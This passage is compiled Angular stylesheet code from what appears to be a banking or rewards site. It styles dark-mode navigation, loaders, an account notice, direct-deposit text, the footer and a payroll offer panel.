      }
    }

    @keyframes _ngcontent-ng-c2725482222_bounce-in {
      0% {
        transform: scale(0)
      }

      50% {
        transform: scale(1.15)
      }

      70% {
        transform: scale(.95)
      }

      to {
        transform: scale(1)
      }
    }

    *[_ngcontent-ng-c2725482222] {
      font-family: Averta;
      line-height: 1.2
    }

    p[_ngcontent-ng-c2725482222] {
      margin: 0;
      font-size: .875em;
      font-weight: 400
    }

    h2[_ngcontent-ng-c2725482222] {
      font-family: Averta;
      font-weight: 700
    }

    button.btn-tooltip[_ngcontent-ng-c2725482222] {
      background-image: url(/assets/images/info.svg);
      border: none;
      background-color: transparent;
      background-repeat: no-repeat;
      background-position: center center;
      background-size: 15px 15px;
      height: 15px;
      width: 15px;
      vertical-align: middle;
      position: relative;
      top: -1px
    }

    button.btn-tooltip.balance-type[_ngcontent-ng-c2725482222] {
      background-image: url(/assets/images/info.svg)
    }

    button.btn-tooltip.gray[_ngcontent-ng-c2725482222] {
      background-image: url(/assets/images/info-light-gray.svg)
    }

    #popper-wrapper.dark-mode[_nghost-ng-c2725482222] .btn-tooltip[_ngcontent-ng-c2725482222],
    #popper-wrapper.dark-mode [_nghost-ng-c2725482222] .btn-tooltip[_ngcontent-ng-c2725482222] {
      background-image: url(/assets/images/info-dark-mode.svg)
    }

    #popper-wrapper.dark-mode[_nghost-ng-c2725482222] .btn-tooltip.balance-type[_ngcontent-ng-c2725482222],
    #popper-wrapper.dark-mode [_nghost-ng-c2725482222] .btn-tooltip.balance-type[_ngcontent-ng-c2725482222] {
      background-image: url(/assets/images/info-dark-mode.svg)
    }
  </style>
  <style>
    #popper-wrapper.dark-mode[_nghost-ng-c3289184638] .side-nav-container[_ngcontent-ng-c3289184638] ul[_ngcontent-ng-c3289184638] li[_ngcontent-ng-c3289184638] button.btn-secondary-nav.selected[_ngcontent-ng-c3289184638],
    #popper-wrapper.dark-mode [_nghost-ng-c3289184638] .side-nav-container[_ngcontent-ng-c3289184638] ul[_ngcontent-ng-c3289184638] li[_ngcontent-ng-c3289184638] button.btn-secondary-nav.selected[_ngcontent-ng-c3289184638] {
      background-color: #9c4fc9
    }

    #popper-wrapper.dark-mode[_nghost-ng-c3289184638] .side-nav-container[_ngcontent-ng-c3289184638] ul[_ngcontent-ng-c3289184638] li[_ngcontent-ng-c3289184638] button[_ngcontent-ng-c3289184638]:hover,
    #popper-wrapper.dark-mode [_nghost-ng-c3289184638] .side-nav-container[_ngcontent-ng-c3289184638] ul[_ngcontent-ng-c3289184638] li[_ngcontent-ng-c3289184638] button[_ngcontent-ng-c3289184638]:hover {
      background: #404040
    }

    #popper-wrapper.dark-mode[_nghost-ng-c3289184638] .info-block-container[_ngcontent-ng-c3289184638] .info-block[_ngcontent-ng-c3289184638] .info-text[_ngcontent-ng-c3289184638]:before,
    #popper-wrapper.dark-mode [_nghost-ng-c3289184638] .info-block-container[_ngcontent-ng-c3289184638] .info-block[_ngcontent-ng-c3289184638] .info-text[_ngcontent-ng-c3289184638]:before {
      content: "";
      background-image: url(/assets/images/cbr-info-dark-mode.svg);
      background-size: contain;
      display: inline-block;
      background-repeat: no-repeat;
      vertical-align: middle;
      height: 31px;
      width: 32px
    }

    @keyframes _ngcontent-ng-c3289184638_menuOpen {
      0% {
        transform: scaleY(0);
        opacity: 0
      }
    }

    @keyframes _ngcontent-ng-c3289184638_slideIn {
      0% {
        transform: translate(100%)
      }

      to {
        transform: translate(0)
      }
    }

    @keyframes _ngcontent-ng-c3289184638_overlayFadeIn {
      0% {
        opacity: 0
      }

      to {
        opacity: .75
      }
    }

    @keyframes _ngcontent-ng-c3289184638_bounce-in {
      0% {
        transform: scale(0)
      }

      50% {
        transform: scale(1.15)
      }

      70% {
        transform: scale(.95)
      }

      to {
        transform: scale(1)
      }
    }

    *[_ngcontent-ng-c3289184638] {
      font-family: Averta;
      line-height: 1.2
    }

    p[_ngcontent-ng-c3289184638] {
      margin: 0;
      font-size: .875em;
      font-weight: 400
    }

    h2[_ngcontent-ng-c3289184638] {
      font-family: Averta;
      font-weight: 700
    }

    .loader-container[_ngcontent-ng-c3289184638] {
      position: absolute;
      top: 0;
      bottom: 0;
      left: 0;
      right: 0;
      display: flex;
      align-items: center
    }

    .loader-container[_ngcontent-ng-c3289184638] .header-copy[_ngcontent-ng-c3289184638] {
      font-size: 2em;
      font-weight: 700;
      color: #000;
      line-height: 1.6;
      letter-spacing: normal;
      text-align: center
    }

    .loader-container[_ngcontent-ng-c3289184638] .supporting-copy[_ngcontent-ng-c3289184638] {
      font-size: 1.25em;
      font-weight: 600;
      color: #6b6b6b;
      line-height: 1.6;
      letter-spacing: normal;
      text-align: center;
      margin-top: 50px;
      padding: 0 20px
    }

    .loader-container[_ngcontent-ng-c3289184638] .loader[_ngcontent-ng-c3289184638] {
      animation-duration: 1s;
      animation-iteration-count: infinite;
      animation-name: rotate-cw;
      animation-timing-function: linear;
      width: 20px;
      height: 20px;
      border: 3px solid #E1251B;
      border-right-color: transparent;
      border-radius: 50%;
      display: inline-block
    }

    .loader-container[_ngcontent-ng-c3289184638] .loader[_ngcontent-ng-c3289184638] p[_ngcontent-ng-c3289184638] {
      font-size: 0px;
      margin: 0
    }

    .loader-container.center-in-parent[_ngcontent-ng-c3289184638] {
      justify-content: center
    }

    .loader-container.right-of-parent[_ngcontent-ng-c3289184638] {
      justify-content: flex-end;
      right: 20px
    }

    .loader-container.inline[_ngcontent-ng-c3289184638] {
      flex-direction: column
    }

    .loader-container.lrg[_ngcontent-ng-c3289184638] {
      z-index: 100;
      justify-content: center;
      height: 100%;
      width: 100%;
      background-color: #fff;
      min-height: 100px
    }

    .loader-container.lrg.inline[_ngcontent-ng-c3289184638] {
      background: none;
      z-index: 0
    }

    .loader-container.lrg[_ngcontent-ng-c3289184638] .loader[_ngcontent-ng-c3289184638] {
      height: 50px;
      width: 50px;
      border-width: 8px
    }

    .loader-container.xlrg[_ngcontent-ng-c3289184638] {
      z-index: 100;
      justify-content: center;
      height: 100%;
      width: 100%;
      background-color: #fff;
      min-height: 300px
    }

    .loader-container.xlrg.inline[_ngcontent-ng-c3289184638] {
      background: none;
      z-index: 0
    }

    .loader-container.xlrg[_ngcontent-ng-c3289184638] .loader[_ngcontent-ng-c3289184638] {
      height: 150px;
      width: 150px;
      border-width: 11px
    }

    .loader-container.opaque[_ngcontent-ng-c3289184638] {
      background-color: rgba(255, 255, 255, .3)
    }
  </style>
  <style>
    #popper-wrapper.dark-mode[_nghost-ng-c726670208] .side-nav-container[_ngcontent-ng-c726670208] ul[_ngcontent-ng-c726670208] li[_ngcontent-ng-c726670208] button.btn-secondary-nav.selected[_ngcontent-ng-c726670208],
    #popper-wrapper.dark-mode [_nghost-ng-c726670208] .side-nav-container[_ngcontent-ng-c726670208] ul[_ngcontent-ng-c726670208] li[_ngcontent-ng-c726670208] button.btn-secondary-nav.selected[_ngcontent-ng-c726670208] {
      background-color: #9c4fc9
    }

    #popper-wrapper.dark-mode[_nghost-ng-c726670208] .side-nav-container[_ngcontent-ng-c726670208] ul[_ngcontent-ng-c726670208] li[_ngcontent-ng-c726670208] button[_ngcontent-ng-c726670208]:hover,
    #popper-wrapper.dark-mode [_nghost-ng-c726670208] .side-nav-container[_ngcontent-ng-c726670208] ul[_ngcontent-ng-c726670208] li[_ngcontent-ng-c726670208] button[_ngcontent-ng-c726670208]:hover {
      background: #404040
    }

    #popper-wrapper.dark-mode[_nghost-ng-c726670208] .info-block-container[_ngcontent-ng-c726670208] .info-block[_ngcontent-ng-c726670208] .info-text[_ngcontent-ng-c726670208]:before,
    #popper-wrapper.dark-mode [_nghost-ng-c726670208] .info-block-container[_ngcontent-ng-c726670208] .info-block[_ngcontent-ng-c726670208] .info-text[_ngcontent-ng-c726670208]:before {
      content: "";
      background-image: url(/assets/images/cbr-info-dark-mode.svg);
      background-size: contain;
      display: inline-block;
      background-repeat: no-repeat;
      vertical-align: middle;
      height: 31px;
      width: 32px
    }

    @keyframes _ngcontent-ng-c726670208_menuOpen {
      0% {
        transform: scaleY(0);
        opacity: 0
      }
    }

    @keyframes _ngcontent-ng-c726670208_slideIn {
      0% {
        transform: translate(100%)
      }

      to {
        transform: translate(0)
      }
    }

    @keyframes _ngcontent-ng-c726670208_overlayFadeIn {
      0% {
        opacity: 0
      }

      to {
        opacity: .75
      }
    }

    @keyframes _ngcontent-ng-c726670208_bounce-in {
      0% {
        transform: scale(0)
      }

      50% {
        transform: scale(1.15)
      }

      70% {
        transform: scale(.95)
      }

      to {
        transform: scale(1)
      }
    }

    *[_ngcontent-ng-c726670208] {
      font-family: Averta;
      line-height: 1.2
    }

    p[_ngcontent-ng-c726670208] {
      margin: 0;
      font-size: .875em;
      font-weight: 400
    }

    h2[_ngcontent-ng-c726670208] {
      font-family: Averta;
      font-weight: 700
    }

    .blade-content[_ngcontent-ng-c726670208] {
      background-image: url(/assets/images/inactive-account.svg);
      background-repeat: no-repeat;
      background-position: left top;
      background-size: 300px 300px;
      padding-top: 330px
    }

    .blade-content[_ngcontent-ng-c726670208] h3[_ngcontent-ng-c726670208] {
      font-size: 2.25em;
      font-weight: 700;
      color: #2b2c32;
      margin: 0 0 20px
    }

    .blade-content[_ngcontent-ng-c726670208] p[_ngcontent-ng-c726670208] {
      font-size: 1.125em;
      font-weight: 400;
      color: #6b6b6b;
      margin: 0 0 50px
    }
  </style>
  <style>
    #popper-wrapper.dark-mode[_nghost-ng-c3345695179] .side-nav-container[_ngcontent-ng-c3345695179] ul[_ngcontent-ng-c3345695179] li[_ngcontent-ng-c3345695179] button.btn-secondary-nav.selected[_ngcontent-ng-c3345695179],
    #popper-wrapper.dark-mode [_nghost-ng-c3345695179] .side-nav-container[_ngcontent-ng-c3345695179] ul[_ngcontent-ng-c3345695179] li[_ngcontent-ng-c3345695179] button.btn-secondary-nav.selected[_ngcontent-ng-c3345695179] {
      background-color: #9c4fc9
    }

    #popper-wrapper.dark-mode[_nghost-ng-c3345695179] .side-nav-container[_ngcontent-ng-c3345695179] ul[_ngcontent-ng-c3345695179] li[_ngcontent-ng-c3345695179] button[_ngcontent-ng-c3345695179]:hover,
    #popper-wrapper.dark-mode [_nghost-ng-c3345695179] .side-nav-container[_ngcontent-ng-c3345695179] ul[_ngcontent-ng-c3345695179] li[_ngcontent-ng-c3345695179] button[_ngcontent-ng-c3345695179]:hover {
      background: #404040
    }

    #popper-wrapper.dark-mode[_nghost-ng-c3345695179] .info-block-container[_ngcontent-ng-c3345695179] .info-block[_ngcontent-ng-c3345695179] .info-text[_ngcontent-ng-c3345695179]:before,
    #popper-wrapper.dark-mode [_nghost-ng-c3345695179] .info-block-container[_ngcontent-ng-c3345695179] .info-block[_ngcontent-ng-c3345695179] .info-text[_ngcontent-ng-c3345695179]:before {
      content: "";
      background-image: url(/assets/images/cbr-info-dark-mode.svg);
      background-size: contain;
      display: inline-block;
      background-repeat: no-repeat;
      vertical-align: middle;
      height: 31px;
      width: 32px
    }

    @keyframes _ngcontent-ng-c3345695179_menuOpen {
      0% {
        transform: scaleY(0);
        opacity: 0
      }
    }

    @keyframes _ngcontent-ng-c3345695179_slideIn {
      0% {
        transform: translate(100%)
      }

      to {
        transform: translate(0)
      }
    }

    @keyframes _ngcontent-ng-c3345695179_overlayFadeIn {
      0% {
        opacity: 0
      }

      to {
        opacity: .75
      }
    }

    @keyframes _ngcontent-ng-c3345695179_bounce-in {
      0% {
        transform: scale(0)
      }

      50% {
        transform: scale(1.15)
      }

      70% {
        transform: scale(.95)
      }

      to {
        transform: scale(1)
      }
    }

    *[_ngcontent-ng-c3345695179] {
      font-family: Averta;
      line-height: 1.2
    }

    p[_ngcontent-ng-c3345695179] {
      margin: 0;
      font-size: .875em;
      font-weight: 400
    }

    h2[_ngcontent-ng-c3345695179] {
      font-family: Averta;
      font-weight: 700
    }

    .blade-direct-deposit[_ngcontent-ng-c3345695179] {
      padding: 0 10%;
      line-height: 22px;
      max-width: auto
    }

    .blade-direct-deposit[_ngcontent-ng-c3345695179] p[_ngcontent-ng-c3345695179] {
      font-family: Averta;
      font-style: normal;
      font-weight: 400;
      font-size: 14px;
      line-height: 22px
    }
  </style>
  <style>
    #popper-wrapper.dark-mode[_nghost-ng-c1930269705] .side-nav-container[_ngcontent-ng-c1930269705] ul[_ngcontent-ng-c1930269705] li[_ngcontent-ng-c1930269705] button.btn-secondary-nav.selected[_ngcontent-ng-c1930269705],
    #popper-wrapper.dark-mode [_nghost-ng-c1930269705] .side-nav-container[_ngcontent-ng-c1930269705] ul[_ngcontent-ng-c1930269705] li[_ngcontent-ng-c1930269705] button.btn-secondary-nav.selected[_ngcontent-ng-c1930269705] {
      background-color: #9c4fc9
    }

    #popper-wrapper.dark-mode[_nghost-ng-c1930269705] .side-nav-container[_ngcontent-ng-c1930269705] ul[_ngcontent-ng-c1930269705] li[_ngcontent-ng-c1930269705] button[_ngcontent-ng-c1930269705]:hover,
    #popper-wrapper.dark-mode [_nghost-ng-c1930269705] .side-nav-container[_ngcontent-ng-c1930269705] ul[_ngcontent-ng-c1930269705] li[_ngcontent-ng-c1930269705] button[_ngcontent-ng-c1930269705]:hover {
      background: #404040
    }

    #popper-wrapper.dark-mode[_nghost-ng-c1930269705] .info-block-container[_ngcontent-ng-c1930269705] .info-block[_ngcontent-ng-c1930269705] .info-text[_ngcontent-ng-c1930269705]:before,
    #popper-wrapper.dark-mode [_nghost-ng-c1930269705] .info-block-container[_ngcontent-ng-c1930269705] .info-block[_ngcontent-ng-c1930269705] .info-text[_ngcontent-ng-c1930269705]:before {
      content: "";
      background-image: url(/assets/images/cbr-info-dark-mode.svg);
      background-size: contain;
      display: inline-block;
      background-repeat: no-repeat;
      vertical-align: middle;
      height: 31px;
      width: 32px
    }

    @keyframes _ngcontent-ng-c1930269705_menuOpen {
      0% {
        transform: scaleY(0);
        opacity: 0
      }
    }

    @keyframes _ngcontent-ng-c1930269705_slideIn {
      0% {
        transform: translate(100%)
      }

      to {
        transform: translate(0)
      }
    }

    @keyframes _ngcontent-ng-c1930269705_overlayFadeIn {
      0% {
        opacity: 0
      }

      to {
        opacity: .75
      }
    }

    @keyframes _ngcontent-ng-c1930269705_bounce-in {
      0% {
        transform: scale(0)
      }

      50% {
        transform: scale(1.15)
      }

      70% {
        transform: scale(.95)
      }

      to {
        transform: scale(1)
      }
    }

    *[_ngcontent-ng-c1930269705] {
      font-family: Averta;
      line-height: 1.2
    }

    p[_ngcontent-ng-c1930269705] {
      margin: 0;
      font-size: .875em;
      font-weight: 400
    }

    h2[_ngcontent-ng-c1930269705] {
      font-family: Averta;
      font-weight: 700
    }

    footer[_ngcontent-ng-c1930269705] {
      background-color: #2b2c32
    }

    nav[_ngcontent-ng-c1930269705] {
      width: 100%
    }

    .footer-wrapper[_ngcontent-ng-c1930269705] {
      padding: 38px 35px;
      overflow: hidden;
      display: flex;
      flex-direction: column
    }

    @media only screen and (min-width: 1440px) {
      .footer-wrapper[_ngcontent-ng-c1930269705] {
        padding: 40px 60px;
        flex-direction: row;
        max-width: 1440px;
        margin-left: auto;
        margin-right: auto
      }
    }

    .footer-wrapper[_ngcontent-ng-c1930269705] ul[_ngcontent-ng-c1930269705] {
      padding: 0
    }

    .footer-wrapper[_ngcontent-ng-c1930269705] ul[_ngcontent-ng-c1930269705] li[_ngcontent-ng-c1930269705] {
      list-style: none;
      margin-bottom: 25px
    }

    .footer-wrapper[_ngcontent-ng-c1930269705] p[_ngcontent-ng-c1930269705],
    .footer-wrapper[_ngcontent-ng-c1930269705] a[_ngcontent-ng-c1930269705] {
      text-decoration: none;
      color: #fff;
      font-size: .875em;
      font-weight: 400
    }

    .footer-container[_ngcontent-ng-c1930269705],
    .locale-container[_ngcontent-ng-c1930269705] {
      width: 100%
    }

    .locale-container[_ngcontent-ng-c1930269705] {
      flex: 0 1 50px
    }

    .footer-list-container[_ngcontent-ng-c1930269705] {
      display: flex;
      flex-direction: column
    }

    @media only screen and (min-width: 1440px) {
      .footer-list-container[_ngcontent-ng-c1930269705] {
        flex-direction: row
      }
    }

    .footer-child[_ngcontent-ng-c1930269705] {
      clear: both
    }

    .footer-child.link-lists[_ngcontent-ng-c1930269705] {
      margin-bottom: 20px;
      display: flex;
      flex-direction: row
    }

    .footer-child.link-lists[_ngcontent-ng-c1930269705] .lists-container[_ngcontent-ng-c1930269705] {
      width: 100%;
      margin-right: 40px;
      display: flex;
      justify-content: space-between;
      flex-direction: row
    }

    .footer-child.link-lists[_ngcontent-ng-c1930269705] .external-link[_ngcontent-ng-c1930269705]:after {
      content: "";
      background-image: url(/assets/images/icon-external-link-white.svg);
      background-size: contain;
      display: inline-block;
      background-repeat: no-repeat;
      vertical-align: middle;
      height: 16px;
      width: 16px;
      align-self: center;
      margin-left: 8px;
      padding-bottom: 4px;
      color: #fff
    }

    @media only screen and (min-width: 1440px) {
      .footer-child.branding-social[_ngcontent-ng-c1930269705] {
        min-width: 500px
      }
    }

    .footer-logo-container[_ngcontent-ng-c1930269705] {
      margin-bottom: 10px
    }

    .footer-logo-container[_ngcontent-ng-c1930269705] h2[_ngcontent-ng-c1930269705] {
      display: inline-block;
      line-height: 0;
      margin: 0
    }

    .footer-logo-container[_ngcontent-ng-c1930269705] a[_ngcontent-ng-c1930269705] {
      display: inline-block;
      line-height: 0
    }

    .footer-app_stores[_ngcontent-ng-c1930269705],
    .footer-social[_ngcontent-ng-c1930269705] {
      overflow: hidden
    }

    .footer-app_stores[_ngcontent-ng-c1930269705] ul[_ngcontent-ng-c1930269705],
    .footer-social[_ngcontent-ng-c1930269705] ul[_ngcontent-ng-c1930269705] {
      clear: both
    }

    .footer-app_stores[_ngcontent-ng-c1930269705] ul[_ngcontent-ng-c1930269705] li[_ngcontent-ng-c1930269705],
    .footer-social[_ngcontent-ng-c1930269705] ul[_ngcontent-ng-c1930269705] li[_ngcontent-ng-c1930269705] {
      float: left;
      margin-right: 10px;
      margin-bottom: 10px
    }

    .footer-app_stores[_ngcontent-ng-c1930269705] ul[_ngcontent-ng-c1930269705] li[_ngcontent-ng-c1930269705] a[_ngcontent-ng-c1930269705],
    .footer-social[_ngcontent-ng-c1930269705] ul[_ngcontent-ng-c1930269705] li[_ngcontent-ng-c1930269705] a[_ngcontent-ng-c1930269705],
    .footer-app_stores[_ngcontent-ng-c1930269705] ul[_ngcontent-ng-c1930269705] li[_ngcontent-ng-c1930269705] a[_ngcontent-ng-c1930269705] img[_ngcontent-ng-c1930269705],
    .footer-social[_ngcontent-ng-c1930269705] ul[_ngcontent-ng-c1930269705] li[_ngcontent-ng-c1930269705] a[_ngcontent-ng-c1930269705] img[_ngcontent-ng-c1930269705] {
      vertical-align: middle
    }

    .footer-app_stores.no-social[_ngcontent-ng-c1930269705] {
      margin-bottom: 25px
    }

    .footer-social[_ngcontent-ng-c1930269705] {
      margin-bottom: 35px
    }

    .footer-social[_ngcontent-ng-c1930269705] ul[_ngcontent-ng-c1930269705] li[_ngcontent-ng-c1930269705] {
      margin-right: 35px
    }

    .footer-social[_ngcontent-ng-c1930269705] ul[_ngcontent-ng-c1930269705] li[_ngcontent-ng-c1930269705] a[_ngcontent-ng-c1930269705] {
      vertical-align: middle;
      opacity: .4;
      transition: opacity .3s ease-out
    }

    .footer-social[_ngcontent-ng-c1930269705] ul[_ngcontent-ng-c1930269705] li[_ngcontent-ng-c1930269705] a[_ngcontent-ng-c1930269705]:hover {
      opacity: 1
    }

    .bottom-container[_ngcontent-ng-c1930269705] {
      display: flex;
      margin: 30px 25px 30px 0;
      justify-content: space-between;
      gap: 65px
    }

    .bottom-container[_ngcontent-ng-c1930269705] .copyright[_ngcontent-ng-c1930269705] {
      clear: both;
      font-size: 14px;
      line-height: 1.6
    }

    @media only screen and (min-width: 1440px) {
      .bottom-container[_ngcontent-ng-c1930269705] .copyright[_ngcontent-ng-c1930269705] {
        margin-bottom: 0
      }
    }

    .bottom-container[_ngcontent-ng-c1930269705] button.ot-sdk-show-settings[_ngcontent-ng-c1930269705] {
      padding: 0 !important;
      border: none !important;
      background: none !important;
      color: #fff !important;
      font-size: 14px !important;
      min-width: 160px;
      align-items: flex-start;
      display: flex;
      margin-top: 3px
    }

    @media screen and (max-width: 768px) {

      .lists-container[_ngcontent-ng-c1930269705],
      .link-lists[_ngcontent-ng-c1930269705] {
        flex-direction: column !important
      }

      ul[_ngcontent-ng-c1930269705] {
        margin: 0
      }

      locale-selector[_ngcontent-ng-c1930269705] {
        display: block;
        margin-top: 16px
      }

      .bottom-container[_ngcontent-ng-c1930269705] {
        flex-direction: column;
        row-gap: 24px;
        margin-top: 0
      }

      .footer-app_stores[_ngcontent-ng-c1930269705] {
        margin: 18px 0
      }

      .footer-app_stores[_ngcontent-ng-c1930269705] li[_ngcontent-ng-c1930269705] {
        margin-bottom: 12px
      }
    }
  </style>
  <style>
    @keyframes _ngcontent-ng-c3239806278_menuOpen {
      0% {
        transform: scaleY(0);
        opacity: 0
      }
    }

    @keyframes _ngcontent-ng-c3239806278_slideIn {
      0% {
        transform: translate(100%)
      }

      to {
        transform: translate(0)
      }
    }

    @keyframes _ngcontent-ng-c3239806278_overlayFadeIn {
      0% {
        opacity: 0
      }

      to {
        opacity: .75
      }
    }

    @keyframes _ngcontent-ng-c3239806278_bounce-in {
      0% {
        transform: scale(0)
      }

      50% {
        transform: scale(1.15)
      }

      70% {
        transform: scale(.95)
      }

      to {
        transform: scale(1)
      }
    }

    #popper-wrapper.dark-mode[_nghost-ng-c3239806278] .side-nav-container[_ngcontent-ng-c3239806278] ul[_ngcontent-ng-c3239806278] li[_ngcontent-ng-c3239806278] button.btn-secondary-nav.selected[_ngcontent-ng-c3239806278],
    #popper-wrapper.dark-mode [_nghost-ng-c3239806278] .side-nav-container[_ngcontent-ng-c3239806278] ul[_ngcontent-ng-c3239806278] li[_ngcontent-ng-c3239806278] button.btn-secondary-nav.selected[_ngcontent-ng-c3239806278] {
      background-color: #9c4fc9
    }

    #popper-wrapper.dark-mode[_nghost-ng-c3239806278] .side-nav-container[_ngcontent-ng-c3239806278] ul[_ngcontent-ng-c3239806278] li[_ngcontent-ng-c3239806278] button[_ngcontent-ng-c3239806278]:hover,
    #popper-wrapper.dark-mode [_nghost-ng-c3239806278] .side-nav-container[_ngcontent-ng-c3239806278] ul[_ngcontent-ng-c3239806278] li[_ngcontent-ng-c3239806278] button[_ngcontent-ng-c3239806278]:hover {
      background: #404040
    }

    #popper-wrapper.dark-mode[_nghost-ng-c3239806278] .info-block-container[_ngcontent-ng-c3239806278] .info-block[_ngcontent-ng-c3239806278] .info-text[_ngcontent-ng-c3239806278]:before,
    #popper-wrapper.dark-mode [_nghost-ng-c3239806278] .info-block-container[_ngcontent-ng-c3239806278] .info-block[_ngcontent-ng-c3239806278] .info-text[_ngcontent-ng-c3239806278]:before {
      content: "";
      background-image: url(/assets/images/cbr-info-dark-mode.svg);
      background-size: contain;
      display: inline-block;
      background-repeat: no-repeat;
      vertical-align: middle;
      height: 31px;
      width: 32px
    }

    h1[_ngcontent-ng-c3239806278],
    h2[_ngcontent-ng-c3239806278] {
      margin: 0;
      display: table
    }

    .logo-link[_ngcontent-ng-c3239806278] {
      cursor: pointer
    }

    .pcf-full-logo[_ngcontent-ng-c3239806278] {
      display: none
    }

    .pcf-logo-without-text[_ngcontent-ng-c3239806278] {
      display: block
    }

    @media only screen and (min-width: 618px) {
      .pcf-full-logo[_ngcontent-ng-c3239806278] {
        display: block
      }

      .pcf-logo-without-text[_ngcontent-ng-c3239806278] {
        display: none
      }
    }
  </style>
  <style>
    #popper-wrapper.dark-mode[_nghost-ng-c1184276130] .side-nav-container[_ngcontent-ng-c1184276130] ul[_ngcontent-ng-c1184276130] li[_ngcontent-ng-c1184276130] button.btn-secondary-nav.selected[_ngcontent-ng-c1184276130],
    #popper-wrapper.dark-mode [_nghost-ng-c1184276130] .side-nav-container[_ngcontent-ng-c1184276130] ul[_ngcontent-ng-c1184276130] li[_ngcontent-ng-c1184276130] button.btn-secondary-nav.selected[_ngcontent-ng-c1184276130] {
      background-color: #9c4fc9
    }

    #popper-wrapper.dark-mode[_nghost-ng-c1184276130] .side-nav-container[_ngcontent-ng-c1184276130] ul[_ngcontent-ng-c1184276130] li[_ngcontent-ng-c1184276130] button[_ngcontent-ng-c1184276130]:hover,
    #popper-wrapper.dark-mode [_nghost-ng-c1184276130] .side-nav-container[_ngcontent-ng-c1184276130] ul[_ngcontent-ng-c1184276130] li[_ngcontent-ng-c1184276130] button[_ngcontent-ng-c1184276130]:hover {
      background: #404040
    }

    #popper-wrapper.dark-mode[_nghost-ng-c1184276130] .info-block-container[_ngcontent-ng-c1184276130] .info-block[_ngcontent-ng-c1184276130] .info-text[_ngcontent-ng-c1184276130]:before,
    #popper-wrapper.dark-mode [_nghost-ng-c1184276130] .info-block-container[_ngcontent-ng-c1184276130] .info-block[_ngcontent-ng-c1184276130] .info-text[_ngcontent-ng-c1184276130]:before {
      content: "";
      background-image: url(/assets/images/cbr-info-dark-mode.svg);
      background-size: contain;
      display: inline-block;
      background-repeat: no-repeat;
      vertical-align: middle;
      height: 31px;
      width: 32px
    }

    @keyframes _ngcontent-ng-c1184276130_menuOpen {
      0% {
        transform: scaleY(0);
        opacity: 0
      }
    }

    @keyframes _ngcontent-ng-c1184276130_slideIn {
      0% {
        transform: translate(100%)
      }

      to {
        transform: translate(0)
      }
    }

    @keyframes _ngcontent-ng-c1184276130_overlayFadeIn {
      0% {
        opacity: 0
      }

      to {
        opacity: .75
      }
    }

    @keyframes _ngcontent-ng-c1184276130_bounce-in {
      0% {
        transform: scale(0)
      }

      50% {
        transform: scale(1.15)
      }

      70% {
        transform: scale(.95)
      }

      to {
        transform: scale(1)
      }
    }

    *[_ngcontent-ng-c1184276130] {
      font-family: Averta;
      line-height: 1.2
    }

    p[_ngcontent-ng-c1184276130] {
      margin: 0;
      font-size: .875em;
      font-weight: 400
    }

    h2[_ngcontent-ng-c1184276130] {
      font-family: Averta;
      font-weight: 700
    }

    button[_ngcontent-ng-c1184276130] {
      background-color: transparent;
      border: none;
      color: #fff;
      padding: 0;
      font-size: 1em;
      font-weight: 400
    }

    button.button-with-icon[_ngcontent-ng-c1184276130] {
      border: 1px solid white;
      padding: 12px;
      border-radius: 24px;
      min-width: 135px;
      text-align: center;
      font-size: 14px
    }

    button.button-with-icon[_ngcontent-ng-c1184276130] img[_ngcontent-ng-c1184276130] {
      display: inline-block;
      position: relative;
      top: 2px;
      margin-right: 2px
    }
  </style>
  <style>
    @keyframes _ngcontent-ng-c3000878099_menuOpen {
      0% {
        transform: scaleY(0);
        opacity: 0
      }
    }

    @keyframes _ngcontent-ng-c3000878099_slideIn {
      0% {
        transform: translate(100%)
      }

      to {
        transform: translate(0)
      }
    }

    @keyframes _ngcontent-ng-c3000878099_overlayFadeIn {
      0% {
        opacity: 0
      }

      to {
        opacity: .75
      }
    }

    @keyframes _ngcontent-ng-c3000878099_bounce-in {
      0% {
        transform: scale(0)
      }

      50% {
        transform: scale(1.15)
      }

      70% {
        transform: scale(.95)
      }

      to {
        transform: scale(1)
      }
    }

    #popper-wrapper.dark-mode[_nghost-ng-c3000878099] .side-nav-container[_ngcontent-ng-c3000878099] ul[_ngcontent-ng-c3000878099] li[_ngcontent-ng-c3000878099] button.btn-secondary-nav.selected[_ngcontent-ng-c3000878099],
    #popper-wrapper.dark-mode [_nghost-ng-c3000878099] .side-nav-container[_ngcontent-ng-c3000878099] ul[_ngcontent-ng-c3000878099] li[_ngcontent-ng-c3000878099] button.btn-secondary-nav.selected[_ngcontent-ng-c3000878099] {
      background-color: #9c4fc9
    }

    #popper-wrapper.dark-mode[_nghost-ng-c3000878099] .side-nav-container[_ngcontent-ng-c3000878099] ul[_ngcontent-ng-c3000878099] li[_ngcontent-ng-c3000878099] button[_ngcontent-ng-c3000878099]:hover,
    #popper-wrapper.dark-mode [_nghost-ng-c3000878099] .side-nav-container[_ngcontent-ng-c3000878099] ul[_ngcontent-ng-c3000878099] li[_ngcontent-ng-c3000878099] button[_ngcontent-ng-c3000878099]:hover {
      background: #404040
    }

    #popper-wrapper.dark-mode[_nghost-ng-c3000878099] .info-block-container[_ngcontent-ng-c3000878099] .info-block[_ngcontent-ng-c3000878099] .info-text[_ngcontent-ng-c3000878099]:before,
    #popper-wrapper.dark-mode [_nghost-ng-c3000878099] .info-block-container[_ngcontent-ng-c3000878099] .info-block[_ngcontent-ng-c3000878099] .info-text[_ngcontent-ng-c3000878099]:before {
      content: "";
      background-image: url(/assets/images/cbr-info-dark-mode.svg);
      background-size: contain;
      display: inline-block;
      background-repeat: no-repeat;
      vertical-align: middle;
      height: 31px;
      width: 32px
    }

    *[_ngcontent-ng-c3000878099] {
      font-family: Averta;
      line-height: 1.2
    }

    p[_ngcontent-ng-c3000878099] {
      margin: 0;
      font-size: .875em;
      font-weight: 400
    }

    h2[_ngcontent-ng-c3000878099] {
      font-family: Averta;
      font-weight: 700
    }

    .payroll-offer[_ngcontent-ng-c3000878099] {
      position: relative
    }

    .payroll-offer-container[_ngcontent-ng-c3000878099] {
      padding: 3% 0;
      border-radius: 8px;
      display: flex;
      align-items: center
    }

    .payroll-offer-container[_ngcontent-ng-c3000878099] .col-1[_ngcontent-ng-c3000878099] {
      padding-left: 5%;
      padding-right: 2%;
      text-align: center
    }

    .payroll-offer-container[_ngcontent-ng-c3000878099] .col-1[_ngcontent-ng-c3000878099] .earn-label[_ngcontent-ng-c3000878099] {
      font-family: Averta;
      font-style: normal;
      font-weight: 700;
      font-size: 12px;
      line-height: 16px;
      margin-bottom: 1%
    }

    .payroll-offer-container[_ngcontent-ng-c3000878099] .col-1[_ngcontent-ng-c3000878099] .points-section[_ngcontent-ng-c3000878099] {
      font-family: Averta;
